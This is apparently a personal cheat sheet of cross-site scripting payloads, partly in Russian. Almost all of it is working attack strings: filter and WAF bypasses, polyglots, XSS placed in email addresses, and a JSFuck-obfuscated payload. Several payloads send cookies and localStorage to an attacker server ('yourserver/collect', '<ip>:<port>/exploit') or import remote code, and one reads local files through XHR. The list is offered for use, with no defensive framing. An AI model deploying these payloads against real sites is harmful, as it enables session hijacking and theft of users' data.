tips for xxs
without parantheses
XSS в Redirect:
```js
javascript:alert(document.domain)
[a](javascript:alert(document.domain))
^(?!javascript:).+
%20javascript:alert()
<script/src=
<img/src/onerror=...>
```

```js
<img src=1 onerror=alert(1)>
#<img src=1 onerror=alert(1)>
<script>document.querySelector(‘#thm-title’).textContent = I am a hacker'</script>

onfucus="alert(9)" autofocus x="

eval('alert(9)')

“e”.charCodeAt(0).toString(16)

в href javascript:alert

<iframe src="javascript:alert(`xss`)"> 


/#/score-board/

"><svg onload=alert(1)>
<svg/onload=alert()>
<img src onerror=alert(0)>


<svg/onload=%26nbsp;alert`1`+
```
---
Основные методы вызова js из html
```js
<script>...</script>
<img onerror="..." src="x">
<a href="%20javascript:..."></a>
<iframe src="javascript:...">
<iframe onload='alert``'>
autofocus onfocus="alert()" #%20 %09
javascript://qwe.com/%0aalert()
encode html entety
```

пробелы могу заменяться “/”, тэг необязательно закрывать
double URL encoding

```js
prompt('xss')
%00<script>alert(9)</script>
alert(location.origin)
${alert}
────────────────────────────────────────────
jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
────────────────────────────────────────────
'),alert()//"><img src=x onerror=alert()>
────────────────────────────────────────────
1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
────────────────────────────────────────────
<h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE
────────────────────────────────────────────
<svg/onload=alert(9)>
────────────────────────────────────────────
<iframe onload=alert(document.domain)>
────────────────────────────────────────────
`+alert()+`
────────────────────────────────────────────
javascript:"http://google.com";alert()
────────────────────────────────────────────
javascript:alert();//@github.com#;alert();://eow5kas78d0wlv0.m.pipedream.net'
────────────────────────────────────────────
Here is An XSS payload that steals both Cookies and Local Storage Data:

<svg/onload='const url = https://yourserver/collect?cookie=${encodeURIComponent(document.cookie)}&localStorage=${encodeURIComponent(JSON.stringify(localStorage))}; fetch(url);'>"
────────────────────────────────────────────
<script>document.location="http://<ip>:<port>/exploit?c=" + document.cookie</script>
────────────────────────────────────────────
?token["</script><script>alert(9)</script>"]=123
────────────────────────────────────────────
json escape xss
\"-alert(1)}//
────────────────────────────────────────────
```
---
```js
javascript:(function(){var scripts=document.getElementsByTagName("script"),regex=/(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))/g;const results=new Set;for(var i=0;i<scripts.length;i++){var t=scripts[i].src;""!=t&&fetch(t).then(function(t){return t.text()}).then(function(t){var e=t.matchAll(regex);for(let r of e)results.add(r[0])}).catch(function(t){console.log("An error occurred: ",t)})}var pageContent=document.documentElement.outerHTML,matches=pageContent.matchAll(regex);for(const match of matches)results.add(match[0]);function writeResults(){results.forEach(function(t){document.write(t+"<br>")})}setTimeout(writeResults,3e3);})();
```
---
```js
xss + lfi <script>x = new XMLHttpRequest(); x.open('GET', 'file:///daab2a45fd5c44bca7b6_unzip/index.js', false); x.send(); document.write('<pre>' + x.responseText + '</pre>');</script>
```
---
```js
'"/test/></title/</script/</style/-->{{7*7}}<iframe/onload='alert``'<!--
```
---
bypassing the Cloudflare WAF:
```js
"%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e" 
```
xss for email:
```js
"><img/src/onerror=import('//domain/')>"@yourdomain.com
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```
```js
<details open id="' &quot;'"ontoggle=alert()>
<details/open/id="&quot;"ontoggle=alert()>
```
---
```js
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])
```
